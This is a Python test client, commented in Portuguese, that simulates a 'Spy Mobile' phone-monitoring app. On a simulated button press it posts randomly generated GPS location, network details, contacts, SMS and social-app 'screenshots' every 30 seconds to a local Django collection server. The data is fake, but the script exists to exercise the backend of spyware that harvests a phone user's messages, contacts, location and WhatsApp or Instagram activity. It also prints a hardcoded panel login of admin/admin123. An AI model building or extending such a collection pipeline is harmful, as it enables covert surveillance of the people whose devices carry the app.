#!/usr/bin/env python3
"""
Script para simular exatamente o que acontece quando o usuário 
clica no botão "PLAY/Iniciar Monitoramento" no app instalado
"""

import requests
import json
import time
import threading
from datetime import datetime
import random

# Configurações (igual ao app.py)
SERVER_IP = '127.0.0.1'  # Altere para IP remoto se necessário
SERVER_PORT = '8000'
BASE_URL = f"http://{SERVER_IP}:{SERVER_PORT}"

# Simular dados do dispositivo
DEVICE_ID = 'spy_mobile_teste_123'
SOCIAL_APPS = ['whatsapp', 'instagram', 'facebook', 'twitter', 'tiktok']

class SimuladorSpyApp:
    def __init__(self):
        self.is_monitoring = False
        self.device_id = DEVICE_ID
        self.collection_count = 0
        self.last_social_app = None
        
    def log(self, message):
        """Simula os logs do app"""
        timestamp = datetime.now().strftime('%H:%M:%S')
        print(f"[{timestamp}] {message}")
    
    def start_monitoring(self):
        """Simula o clique no botão PLAY"""
        print("🎯 SIMULANDO CLIQUE NO BOTÃO 'PLAY' DO APP")
        print("=" * 50)
        
        if not self.is_monitoring:
            self.is_monitoring = True
            self.log("✅ Monitoramento iniciado")
            self.log("📱 Status: Ativo")
            
            # Solicitar permissões (simulado)
            self.request_permissions()
            
            # Iniciar thread de monitoramento
            self.monitoring_thread = threading.Thread(target=self.monitoring_loop, daemon=True)
            self.monitoring_thread.start()
            
            return True
        return False
    
    def stop_monitoring(self):
        """Simula o clique no botão STOP"""
        print("\n🛑 SIMULANDO CLIQUE NO BOTÃO 'STOP' DO APP")
        self.is_monitoring = False
        self.log("⏹️ Monitoramento parado")
        self.log("📱 Status: Parado")
    
    def request_permissions(self):
        """Simula solicitação de permissões"""
        permissions = [
            'ACCESS_FINE_LOCATION',
            'READ_SMS', 
            'READ_CONTACTS',
            'CAMERA'
        ]
        
        for perm in permissions:
            self.log(f"🔐 Solicitado: {perm}")
            time.sleep(0.5)
        
        self.log("✅ Permissões solicitadas")
    
    def monitoring_loop(self):
        """Loop principal de monitoramento (igual ao app.py)"""
        self.log("🔄 Iniciando loop de monitoramento...")
        
        while self.is_monitoring:
            try:
                self.log("📊 Coletando dados...")
                
                # Simular coleta de dados (igual ao app.py)
                if self.is_monitoring:
                    self.collect_data()
                
                # Aguardar 30 segundos (como no app real)
                for i in range(30):
                    if not self.is_monitoring:
                        break
                    time.sleep(1)
                
            except Exception as e:
                self.log(f"❌ Erro no loop: {e}")
                time.sleep(10)
    
    def collect_data(self):
        """Coleta dados básicos (igual ao app.py)"""
        try:
            # 1. Coletar localização
            lat, lon = self.get_location()
            if lat and lon:
                self.send_location(lat, lon)
            
            # 2. Coletar IP
            ip = self.get_ip()
            if ip:
                self.send_network_info(ip)
            
            # 3. Verificar apps sociais
            self.check_social_apps()
            
            # 4. Coletar contatos e SMS (menos frequente)
            if self.collection_count % 10 == 0:
                self.collect_contacts_and_sms()
            
            self.collection_count += 1
            
        except Exception as e:
            self.log(f"❌ Erro na coleta: {e}")
    
    def get_location(self):
        """Simula obtenção de GPS"""
        # Coordenadas aleatórias próximas a São Paulo
        lat = -23.5505 + random.uniform(-0.1, 0.1)
        lon = -46.6333 + random.uniform(-0.1, 0.1)
        return lat, lon
    
    def get_ip(self):
        """Simula obtenção de IP"""
        return f"192.168.1.{random.randint(100, 200)}"
    
    def send_location(self, lat, lon):
        """Envia localização (igual ao app.py)"""
        try:
            url = f"{BASE_URL}/api/localizacao/"
            data = {
                'imei': self.device_id,
                'latitude': lat,
                'longitude': lon,
                'timestamp': datetime.now().isoformat()
            }
            response = requests.post(url, json=data, timeout=10)
            if response.status_code in [200, 201]:
                self.log("✅ Localização enviada")
            else:
                self.log(f"⚠️ Erro localização: {response.status_code}")
        except Exception as e:
            self.log(f"❌ Falha localização: {e}")
    
    def send_network_info(self, ip):
        """Envia informações de rede (igual ao app.py)"""
        try:
            url = f"{BASE_URL}/api/atividade-rede/"
            data = {
                'imei': self.device_id,
                'ip': ip,
                'wifi_status': 'Conectado - MinhaRede',
                'timestamp': datetime.now().isoformat()
            }
            response = requests.post(url, json=data, timeout=10)
            if response.status_code in [200, 201]:
                self.log("✅ Rede enviada")
            else:
                self.log(f"⚠️ Erro rede: {response.status_code}")
        except Exception as e:
            self.log(f"❌ Falha rede: {e}")
    
    def check_social_apps(self):
        """Verifica apps sociais (igual ao app.py)"""
        try:
            # Simular detecção de app social
            current_app = random.choice(SOCIAL_APPS + [None, None, None])  # Mais chance de None
            
            if current_app and current_app != self.last_social_app:
                self.last_social_app = current_app
                self.log(f"📱 Detectado: {current_app}")
                self.take_social_screenshot(current_app)
        
        except Exception as e:
            self.log(f"❌ Erro apps sociais: {e}")
    
    def take_social_screenshot(self, app_name):
        """Simula screenshot de rede social"""
        try:
            # Simular screenshot
            screenshot_data = f"screenshot_fake_data_{app_name}_{datetime.now().timestamp()}"
            
            # Simular upload
            self.upload_screenshot_data(screenshot_data, app_name)
            self.log(f"📸 Screenshot {app_name} tirado")
            
            # Simular salvamento de conversas
            self.save_conversation_history(app_name)
            
        except Exception as e:
            self.log(f"❌ Erro screenshot {app_name}: {e}")
    
    def upload_screenshot_data(self, screenshot_data, app_name):
        """Simula upload de screenshot"""
        try:
            url = f"{BASE_URL}/api/upload/"
            
            # Simular arquivo
            files = {'screenshot': ('screenshot.png', screenshot_data.encode(), 'image/png')}
            data = {
                'imei': self.device_id,
                'tipo': f'screenshot_{app_name}'
            }
            
            response = requests.post(url, files=files, data=data, timeout=30)
            if response.status_code in [200, 201]:
                self.log(f"✅ Screenshot {app_name} enviado")
            else:
                self.log(f"⚠️ Erro upload: {response.status_code}")
        except Exception as e:
            self.log(f"❌ Falha upload: {e}")
    
    def save_conversation_history(self, app_name):
        """Simula salvamento de histórico"""
        conversations = [
            f"Conversa exemplo 1 - {app_name}",
            f"Conversa exemplo 2 - {app_name}",
            f"Mensagem de teste - {datetime.now()}"
        ]
        
        self.log(f"💬 Histórico {app_name} salvo ({len(conversations)} conversas)")
    
    def collect_contacts_and_sms(self):
        """Coleta contatos e SMS (igual ao app.py)"""
        try:
            # Simular contatos
            contacts = [
                {'nome': 'João Silva', 'telefone': '11999999999'},
                {'nome': 'Maria Santos', 'telefone': '11888888888'}
            ]
            
            url = f"{BASE_URL}/api/contatos/"
            data = {
                'imei': self.device_id,
                'contatos': contacts
            }
            response = requests.post(url, json=data, timeout=10)
            
            # Simular SMS
            sms_list = [
                {'remetente': '11999999999', 'destinatario': self.device_id, 
                 'mensagem': 'Mensagem de teste', 'tipo': 'recebido'}
            ]
            
            url = f"{BASE_URL}/api/sms/"
            data = {
                'imei': self.device_id,
                'sms': sms_list
            }
            response = requests.post(url, json=data, timeout=10)
            
            self.log("✅ Contatos e SMS coletados")
            
        except Exception as e:
            self.log(f"❌ Erro contatos/SMS: {e}")

def testar_conectividade_inicial():
    """Testa se o servidor está online antes de iniciar"""
    print("🔍 Testando conectividade com servidor...")
    try:
        response = requests.get(f"{BASE_URL}/api/test/", timeout=5)
        if response.status_code == 200:
            print("✅ Servidor online e funcionando")
            return True
        else:
            print(f"⚠️ Servidor respondeu com status: {response.status_code}")
            return False
    except requests.exceptions.ConnectionError:
        print("❌ Servidor offline ou inacessível")
        print(f"💡 Certifique-se de que o Django está rodando em {BASE_URL}")
        return False
    except Exception as e:
        print(f"❌ Erro de conectividade: {e}")
        return False

def main():
    """Função principal - simula uso real do app"""
    print("📱 SIMULADOR DO BOTÃO 'ENVIAR' DO SPY MOBILE")
    print("=" * 55)
    print(f"🌐 Servidor: {BASE_URL}")
    print(f"📱 Dispositivo: {DEVICE_ID}")
    
    # Testar conectividade
    if not testar_conectividade_inicial():
        print("\n❌ Não é possível continuar sem conexão com o servidor")
        return
    
    # Criar simulador
    app = SimuladorSpyApp()
    
    try:
        # Simular clique no botão PLAY
        if app.start_monitoring():
            print(f"\n⏰ Monitoramento ativo por 60 segundos...")
            print("📊 Dados sendo enviados a cada 30 segundos")
            print("🛑 Pressione Ctrl+C para parar\n")
            
            # Deixar rodar por 60 segundos (2 ciclos completos)
            time.sleep(60)
            
            # Parar monitoramento
            app.stop_monitoring()
        
    except KeyboardInterrupt:
        print("\n\n🛑 Interrompido pelo usuário")
        app.stop_monitoring()
    
    print("\n📋 TESTE CONCLUÍDO!")
    print(f"🌐 Verifique os dados em: {BASE_URL}/dispositivos/")
    print(f"🔑 Login: admin / admin123")
    print(f"🔍 Procure pelo dispositivo: {DEVICE_ID}")

if __name__ == "__main__":
    main()